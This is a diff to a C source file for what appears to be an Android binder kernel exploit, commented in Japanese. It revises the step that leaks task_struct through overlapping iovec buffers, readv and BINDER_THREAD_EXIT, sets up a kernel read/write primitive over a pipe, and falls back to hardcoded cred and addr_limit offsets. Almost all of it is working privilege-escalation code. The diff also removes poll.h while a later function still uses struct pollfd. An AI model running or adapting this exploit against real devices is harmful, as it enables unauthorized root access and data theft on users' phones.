@@ -18,7 +18,6 @@
 #include <sched.h>
 #include <signal.h>
 #include <pthread.h>
-#include <poll.h>
 
 #include "binder.h"
 
@@ -67,17 +66,16 @@ void *mmap_page(unsigned long addr) {
     return mem;
 }
 
-// ========== Step 1: readv で task_struct リーク ==========
+// ========== Step 1: クラウドファズ方式で task_struct リーク ==========
 int leak_task_struct(void) {
     int pipefd[2];
     pid_t cpid;
     struct iovec iovec_stack[IOVEC_COUNT];
     void *aligned_address;
-    struct pollfd pfd;
     ssize_t n;
     uint64_t *data;
 
-    LOGI("[*] Leaking task_struct via readv");
+    LOGI("[*] Leaking task_struct via readv (cloudfuzz method)");
 
     binder_fd = open("/dev/binder", O_RDWR);
     if (binder_fd < 0) {
@@ -127,6 +125,7 @@ int leak_task_struct(void) {
     }
     LOGI("[+] aligned_address=%p", aligned_address);
 
+    // iovec オーバーラップ設定（INDEX=10, 11 が同じバッファを指す）
     memset(iovec_stack, 0, sizeof(iovec_stack));
     iovec_stack[OVERLAP_INDEX].iov_base = aligned_address;
     iovec_stack[OVERLAP_INDEX].iov_len = PAGE_SIZE;
@@ -145,6 +144,7 @@ int leak_task_struct(void) {
     }
 
     if (cpid == 0) {
+        // 子プロセス: 100ms 待機してから BINDER_THREAD_EXIT
         usleep(100000);
         LOGI("[child] BINDER_THREAD_EXIT...");
         ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
@@ -152,26 +152,8 @@ int leak_task_struct(void) {
         _exit(0);
     }
 
-    pfd.fd = pipefd[0];
-    pfd.events = POLLIN;
-    int poll_ret = poll(&pfd, 1, 5000);
-    if (poll_ret < 0) {
-        LOGE("poll failed: %s", strerror(errno));
-        close(binder_fd);
-        close(epoll_fd);
-        close(pipefd[0]);
-        close(pipefd[1]);
-        return -1;
-    }
-    if (poll_ret == 0) {
-        LOGE("poll timeout");
-        close(binder_fd);
-        close(epoll_fd);
-        close(pipefd[0]);
-        close(pipefd[1]);
-        return -1;
-    }
-
+    // 親: readv を呼び出す（ブロックするが、子が BINDER_THREAD_EXIT を呼ぶとデータが来る）
+    LOGI("[parent] Calling readv...");
     n = readv(pipefd[0], iovec_stack, IOVEC_COUNT);
     LOGI("[parent] readv returned %zd bytes", n);
     if (n < 0) {
@@ -183,6 +165,7 @@ int leak_task_struct(void) {
         return -1;
     }
 
+    // リークした task_struct を探す
     data = (uint64_t *)aligned_address;
     for (int i = 0; i < (n / 8); i++) {
         uint64_t val = data[i];
@@ -209,7 +192,7 @@ int leak_task_struct(void) {
     return 0;
 }
 
-// ========== Step 2: カーネル読み書きプリミティブ ==========
+// ========== Step 2: カーネル読み書きプリミティブ（krw_pipe） ==========
 int setup_kernel_rw(void) {
     LOGI("[*] Setting up kernel RW...");
 
@@ -257,6 +240,8 @@ int setup_kernel_rw(void) {
         _exit(0);
     }
 
+    // readv で krw_pipe にデータを読み込む（ブロック）
+    // 代わりに poll で待つ
     struct pollfd pfd;
     pfd.fd = krw_pipe[0];
     pfd.events = POLLIN;
@@ -323,7 +308,7 @@ int scan_task_struct(void) {
         return 0;
     }
 
-    // フォールバック
+    // フォールバック（既知のオフセット）
     LOGI("[!] Using fallback offsets: cred=0x688, addr_limit=0xA18");
     cred_offset = 0x688;
     addr_limit_offset = 0xA18;
